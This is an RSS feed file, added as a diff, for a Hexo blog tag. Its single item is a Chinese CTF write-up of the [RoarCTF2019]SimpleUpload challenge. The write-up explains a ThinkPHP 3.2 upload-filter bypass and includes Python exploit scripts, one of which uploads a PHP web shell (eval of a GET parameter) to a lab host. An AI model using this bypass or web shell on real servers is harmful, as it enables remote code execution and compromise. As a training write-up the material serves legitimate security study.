@@ -1,0 +1,186 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;thinkphp3.2.4&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Sun, 22 Sep 2024 20:06:00 +0800</pubDate>
+        <lastBuildDate>Sun, 22 Sep 2024 20:06:00 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>mysql</category>
+        <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
+        <category>xpath注入</category>
+        <category>Padding oracle attack 与CBC翻转字节攻击</category>
+        <category>php</category>
+        <category>sql盲注</category>
+        <category>php7.4</category>
+        <category>FFI预处理</category>
+        <category>thinkphp3.2.4</category>
+        <category>jwt</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/22/RoarCTF2019-SimpleUpload/</guid>
+            <title>[RoarCTF2019]SimpleUpload</title>
+            <link>http://odiws.github.io/2024/09/22/RoarCTF2019-SimpleUpload/</link>
+            <category>buuctf</category>
+            <category>thinkphp3.2.4</category>
+            <pubDate>Sun, 22 Sep 2024 20:06:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;roarctf2019simpleupload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf2019simpleupload&#34;&gt;#&lt;/a&gt; [RoarCTF2019]SimpleUpload&lt;/h2&gt;
+&lt;p&gt;推荐链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbmFuYi5naXRodWIuaW8vMjAyMS8wOS8xNS9Sb2FyQ1RGLTIwMTktU2ltcGxlLVVwbG9hZC8=&#34;&gt;https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; &amp;lt;?php
+namespace Home\Controller;
+
+use Think\Controller;
+
+class IndexController extends Controller
+&amp;#123;
+    public function index()
+    &amp;#123;
+        show_source(__FILE__);
+    &amp;#125;
+    public function upload()
+    &amp;#123;
+        $uploadFile = $_FILES[&#39;file&#39;] ;
+        
+        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &amp;quot;.php&amp;quot;) ) &amp;#123;
+            return false;
+        &amp;#125;
+        
+        $upload = new \Think\Upload();// 实例化上传类
+        $upload-&amp;gt;maxSize  = 4096 ;// 设置附件上传大小
+        $upload-&amp;gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
+        $upload-&amp;gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录
+        $upload-&amp;gt;savePath = &#39;&#39;;// 设置附件上传子目录
+        $info = $upload-&amp;gt;upload() ;
+        if(!$info) &amp;#123;// 上传错误提示错误信息
+          $this-&amp;gt;error($upload-&amp;gt;getError());
+          return;
+        &amp;#125;else&amp;#123;// 上传成功 获取上传文件信息
+          $url = __ROOT__.substr($upload-&amp;gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;
+          echo json_encode(array(&amp;quot;url&amp;quot;=&amp;gt;$url,&amp;quot;success&amp;quot;=&amp;gt;1));
+        &amp;#125;
+    &amp;#125;
+&amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;知识点：&lt;/p&gt;
+&lt;p&gt;tp 默认上传目录：index.php/home/index/upload&lt;/p&gt;
+&lt;p&gt;tp 支持多个文件上传&lt;/p&gt;
+&lt;p&gt;tp 的文件上传用法这里不对，限定后缀应为 $upload-&amp;gt;exts，所以文件名过滤无效&lt;/p&gt;
+&lt;p&gt;tp 上传默认命名方式受时间戳控制，所以时间间隔很短的上传文件名会大致一样&lt;/p&gt;
+&lt;p&gt;解题方法：&lt;/p&gt;
+&lt;p&gt;题目中会打印出来上传成功的不以.php 结尾的文件名，通过同时上传多个文件的方法拿到 php 两侧文件的文件名，然后根据不一样的位数爆破 php 文件名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+#from io import BytesIO
+
+url=&amp;quot;http://cf4a0675-7522-4210-bbdf-0492504324b3.node4.buuoj.cn:81/index.php/home/index/upload&amp;quot;
+
+files1 = &amp;#123;&#39;file&#39;: open(&#39;1.txt&#39;,&#39;r&#39;)&amp;#125;
+files2 = &amp;#123;&#39;file[]&#39;: open(&#39;1.php&#39;,&#39;r&#39;)&amp;#125;
+
+r = requests.post(url,files=files1)
+print(r.text)
+
+r = requests.post(url,files=files2)
+print(r.text)
+
+r = requests.post(url,files=files1)
+print(r.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其他方法：直接上传 xxx.&amp;lt;&amp;gt;php 即可直接拿到文件名&lt;/p&gt;
+&lt;p&gt;其他方法：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+url = &amp;quot;http://83a80334-cdce-4f32-af7b-18f7d54b565f.node5.buuoj.cn:81/index.php/home/index/upload/&amp;quot;
+s = requests.Session()
+files = &amp;#123;&amp;quot;file&amp;quot;: (&amp;quot;shell.&amp;lt;&amp;gt;php&amp;quot;, &amp;quot;&amp;lt;?php eval($_GET[&#39;cmd&#39;])?&amp;gt;&amp;quot;)&amp;#125;
+r = requests.post(url, files=files)
+print(r.text)
+&lt;/code&gt;&lt;/pre&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
